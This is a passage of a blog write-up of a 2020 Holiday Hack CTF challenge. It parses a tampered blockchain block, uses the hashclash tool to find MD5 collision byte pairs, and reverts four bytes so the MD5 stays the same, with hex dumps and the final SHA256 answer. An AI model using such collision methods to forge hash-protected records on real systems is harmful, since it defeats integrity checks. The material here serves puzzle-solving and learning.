    self<span style=color:#f92672>.</span>score <span style=color:#f92672>=</span> int(fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>8</span>), <span style=color:#ae81ff>16</span>)
    self<span style=color:#f92672>.</span>sign <span style=color:#f92672>=</span> int(fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>10</span>)
    count <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>doc_count
    <span style=color:#66d9ef>while</span> count <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>:
        l_data <span style=color:#f92672>=</span> {
            <span style=color:#e6db74>&#39;type&#39;</span>: int(fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>2</span>), <span style=color:#ae81ff>16</span>),
            <span style=color:#e6db74>&#39;length&#39;</span>: int(fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>8</span>), <span style=color:#ae81ff>16</span>)
        }
        l_data[<span style=color:#e6db74>&#39;data&#39;</span>] <span style=color:#f92672>=</span> fh<span style=color:#f92672>.</span>read(l_data[<span style=color:#e6db74>&#39;length&#39;</span>])
        self<span style=color:#f92672>.</span>data<span style=color:#f92672>.</span>append(l_data)
        count <span style=color:#f92672>-=</span> <span style=color:#ae81ff>1</span>
    self<span style=color:#f92672>.</span>month <span style=color:#f92672>=</span> int(fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>2</span>))
    self<span style=color:#f92672>.</span>day <span style=color:#f92672>=</span> int(fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>2</span>))
    self<span style=color:#f92672>.</span>hour <span style=color:#f92672>=</span> int(fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>2</span>))
    self<span style=color:#f92672>.</span>minute <span style=color:#f92672>=</span> int(fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>2</span>))
    self<span style=color:#f92672>.</span>second <span style=color:#f92672>=</span> int(fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>2</span>))
    self<span style=color:#f92672>.</span>previous_hash <span style=color:#f92672>=</span> str(fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>32</span>))[<span style=color:#ae81ff>2</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
    self<span style=color:#f92672>.</span>hash <span style=color:#f92672>=</span> str(fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>32</span>))[<span style=color:#ae81ff>2</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
    self<span style=color:#f92672>.</span>sig <span style=color:#f92672>=</span> fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>344</span>)
    <span style=color:#66d9ef>return</span> self
</code></pre></div><p>Each property assignment came from reading a certain number of bytes of a raw block. For example, the index lived in the first 16 bytes of the block. Referencing a hex editor, we could confirm all of these. i.e. The hex value <code>0x1F9B3</code> which is the index matches the parsed value of <code>129459</code> when we re-hashed the blockchain to identify the modified block.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/blockchain_modified_block_snippet.png> <figcaption>
modified blockchain block snippet of the first 160 bytes, with the first 64 bytes highlighted using &lt;https://hexed.it/>
</figcaption>
</figure>
<p>I followed the <code>load_a_block()</code> function and marked the starting points of interesting fields so that I could navigate the file a little easier as well. This way I could easily identify metadata from data etc. Looking at the value for the score, we could see that this was a really, really high number. So, I thought this must be where one of the bytes had to change. I tried to manually fiddle with the bytes there and recalculate the MD5 hash, but to no avail.</p>
<p>My next step was to try out the <a href=https://github.com/cr-marcstevens/hashclash>hashclash</a> proof of concept. I downloaded the binary release and navigated to the <code>scripts/</code> directory. In here I made a new folder to work in, and copied out the first 64 bytes as a prefix to try.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>$ xxd prefix.dat
00000000: 3030 3030 3030 3030 3030 3031 6639 6233  000000000001f9b3
00000010: 6139 3434 3765 3537 3731 6337 3034 6634  a9447e5771c704f4
00000020: 3030 3030 3030 3030 3030 3031 3266 6431  0000000000012fd1
00000030: 3030 3030 3030 3030 3030 3030 3032 3066  000000000000020f
</code></pre></div><p>Next, I ran the <code>poc_no.sh</code> script with my prefix, and waited :D</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/block_chain_modified_hashclash_start.png> <figcaption>
hashclash running on my chosen 64byte prefix
</figcaption>
</figure>
<p>After not too long hashclash generated two files that had the same prefix, but had trailing bytes changed such that the MD5 of both files were the same! Incredible.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/block_chain_modified_hashclash_end.png> <figcaption>
first hashclash MD5 collision found
</figcaption>
</figure>
<p>From the <code>radiff2</code> output we could see that the bytes we can fiddle with are at offsets <code>0x00000040</code> and <code>0x00000080</code>. From slide 109 in the presentation, we also know that one byte typically goes up, and the other corresponding one goes down. Given that the block we&rsquo;re working with has supposedly already been fiddled with, to get back to the original values we need to inverse those addition and subtraction operations, right? So, using the locations of the bytes identified by hashclash as reference, I did just that.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/blockchain_first_collision.png> <figcaption>
first reverted bytes in the modified block
</figcaption>
</figure>
<p>That <code>0x31</code> became <code>0x30</code> and that <code>0xD6</code> became a <code>0xD7</code>. The first changed byte actually changed the sign of the value, which explains why it was so high too! With these two bytes changed, checking the MD5 of the block, you&rsquo;d find that it was still <code>b10b4a6bd373b61f32f4fd3a0cdfbf84</code>. 🚀</p>
<p>The next two bytes were a little harder to identify. I spent a bunch more time trying to manually find them, and for the longest time fixated on the <code>&lt;&lt;Type/Catalog/_Go_Away/Santa/Pages</code> tag in the dump. Specifically, changing <code>Pages 2</code> to things like <code>Pages 3</code> or <code>Pages 1</code>. Unfortunately I just couldn&rsquo;t get the MD5 sum to remain unchanged. Out of interest, I changed the same value in the raw PDF document (extracted from the block remember), and was met with this when opened:</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/jack_frost_actually_very_naughty.png> <figcaption>
jack frost being not so nice after all
</figcaption>
</figure>
<p>Looks like Jack Frost managed to hide some complaints in that PDF. ha ha.</p>
<p>To find the other two bytes to modify, I resorted to using the hashclash poc again. I gradually increased the prefix used to one that was eventually 256 bytes long to find the next two bytes that had to be changed.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>$ xxd modified_block.256.dat
00000000: 3030 3030 3030 3030 3030 3031 6639 6233  000000000001f9b3
00000010: 6139 3434 3765 3537 3731 6337 3034 6634  a9447e5771c704f4
00000020: 3030 3030 3030 3030 3030 3031 3266 6431  0000000000012fd1
00000030: 3030 3030 3030 3030 3030 3030 3032 3066  000000000000020f
00000040: 3266 6666 6666 6666 6631 6666 3030 3030  2ffffffff1ff0000
00000050: 3030 3663 ea46 5340 303a 6079 d3df 2762  006c.FS@0:`y..&#39;b
00000060: be68 467c 27f0 46d3 a7ff 4e92 dfe1 def7  .hF|&#39;.F...N.....
00000070: 407f 2a7b 73e1 b759 b8b9 1945 1e37 518d  @.*{s..Y...E.7Q.
00000080: 22d9 8729 6fcb 0f18 8dd6 0388 bf20 350f  &#34;..)o........ 5.
00000090: 2a91 c29d 0348 614d c0bc eef2 bcad d4cc  *....HaM........
000000a0: 3f25 1ba8 f9fb af17 1a06 df1e 1fd8 6493  ?%............d.
000000b0: 96ab 86f9 d511 8cc8 d820 4b4f fe8d 8f09  ......... KO....
000000c0: 3035 3030 3030 3966 3537 2550 4446 2d31  0500009f57%PDF-1
000000d0: 2e33 0a25 25c1 cec7 c521 0a0a 3120 3020  .3.%%....!..1 0
000000e0: 6f62 6a0a 3c3c 2f54 7970 652f 4361 7461  obj.&lt;&lt;/Type/Cata
000000f0: 6c6f 672f 5f47 6f5f 4177 6179 2f53 616e  log/_Go_Away/San
</code></pre></div><figure>
<img loading=lazy src=/images/holidayhack-20/blockchain_second_collision.png> <figcaption>
second hashclash MD5 collision found
</figcaption>
</figure>
<p>Turns out I wasn&rsquo;t too far off with that Pages value, but this helped confirm and identify the next two bytes to swap.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/blockchain_fixed_block.png> <figcaption>
4 fixed bytes in the modified block
</figcaption>
</figure>
<p>Doing that meant the MD5 sum was still the same, however, the sha256 sum was now <code>fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb</code> which was also the objectives answer.</p>
</div>
<footer class=post-footer>
<nav class=paginav>
<a class=prev href=https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-pollex/>
<span class=title>« Prev Page</span>
<br>
<span>NahamCon2021 CTF - Pollex</span>
</a>
<a class=next href=https://leonjza.github.io/blog/2018/03/11/microcorruption-santa-cruz/>
<span class=title>Next Page »</span>
<br>
<span>microcorruption - santa cruz</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share the 2020 kinglecon 3 holiday hack challenge on twitter" href="https://twitter.com/intent/tweet/?text=the%202020%20kinglecon%203%20holiday%20hack%20challenge&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2020%2f12%2f30%2fthe-2020-kinglecon-3-holiday-hack-challenge%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share the 2020 kinglecon 3 holiday hack challenge on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2020%2f12%2f30%2fthe-2020-kinglecon-3-holiday-hack-challenge%2f&title=the%202020%20kinglecon%203%20holiday%20hack%20challenge&summary=the%202020%20kinglecon%203%20holiday%20hack%20challenge&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2020%2f12%2f30%2fthe-2020-kinglecon-3-holiday-hack-challenge%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share the 2020 kinglecon 3 holiday hack challenge on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2020%2f12%2f30%2fthe-2020-kinglecon-3-holiday-hack-challenge%2f&title=the%202020%20kinglecon%203%20holiday%20hack%20challenge"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share the 2020 kinglecon 3 holiday hack challenge on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2020%2f12%2f30%2fthe-2020-kinglecon-3-holiday-hack-challenge%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share the 2020 kinglecon 3 holiday hack challenge on whatsapp" href="https://api.whatsapp.com/send?text=the%202020%20kinglecon%203%20holiday%20hack%20challenge%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2020%2f12%2f30%2fthe-2020-kinglecon-3-holiday-hack-challenge%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share the 2020 kinglecon 3 holiday hack challenge on telegram" href="https://telegram.me/share/url?text=the%202020%20kinglecon%203%20holiday%20hack%20challenge&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2020%2f12%2f30%2fthe-2020-kinglecon-3-holiday-hack-challenge%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>@leonjza</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>